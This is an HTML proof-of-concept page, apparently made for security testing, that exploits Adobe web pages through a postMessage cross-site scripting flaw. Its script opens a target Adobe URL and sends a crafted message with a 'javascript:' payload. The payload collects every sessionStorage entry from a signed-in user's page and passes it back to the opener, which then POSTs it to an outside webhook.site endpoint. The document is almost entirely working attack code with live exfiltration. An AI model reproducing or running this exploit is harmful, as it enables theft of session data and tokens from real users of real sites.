<!DOCTYPE html
<html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Window Opener</title>
  </head>
  <body>
    <h1>Window Opener and Message Sender</h1>
    <p>Click "Open Window" to open the Adobe URL in a new window and automatically send the message after 10 seconds.</p>
    <ol>
      <li>Sign in to Adobe account</li>
      <li>Input one of the URLs below</li>
      <ol>
        <li>https://www.adobe.com/acrobat/business/sign.html?fromES=true#mini-plans-web-cta-acrobat-pro-teams-card</li>
        <li>https://mwpw-182221-3in1-xss--milo--mirafedas.aem.page/drafts/mirafedas/3in1-test-page#mini-plans-web-cta-illustrator-card</li>
      </ol>
      <li>Click "Open Window"</li>
    </ol>

    <form action="">
      <input type="text" name="url" id="url" placeholder="Page URL">
      <button id="openButton">Open Window</button>
    </form>

    <script>
      let childWindow = null;
      let webhookUrl = 'https://webhook.site/3444004f-f792-4702-8e8f-65bbc886712f'; // Paste your webhook.site URL here

      // Listen for messages from the child window
      window.addEventListener('message', (event) => {
        // Check if this is our sessionStorage data
        if (event.data && event.data.sessionStorageData) {
          console.log('Received sessionStorage data:', event.data.sessionStorageData);
          
          // Send to webhook.site from parent window (no CORS issues!)
          fetch(webhookUrl, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(event.data.sessionStorageData)
          })
          .then(response => {
            console.log('Successfully sent to webhook.site!', response.status);
          })
          .catch(error => {
            console.error('Error sending to webhook:', error);
          });
        }
      });

      document.getElementById('openButton').addEventListener('click', () => {
        childWindow = window.open(document.getElementById('url').value, '_blank');
        if (childWindow) {
          setTimeout(() => {
            if (childWindow && !childWindow.closed) {
              const message = JSON.stringify({
                app: 'ucv3',
                subType: 'EXTERNAL',
                data: {
                  externalUrl: `javascript:(function(){let data={};for(let i=0;i<sessionStorage.length;i++){let k=sessionStorage.key(i);data[k]=sessionStorage.getItem(k);}window.opener.postMessage({sessionStorageData:data},'*');})();`,
                  target: '_blank'
                }
              });
              childWindow.postMessage(message, '*');
            }
          }, 14000);
        }
      });
    </script>
  </body>
</html>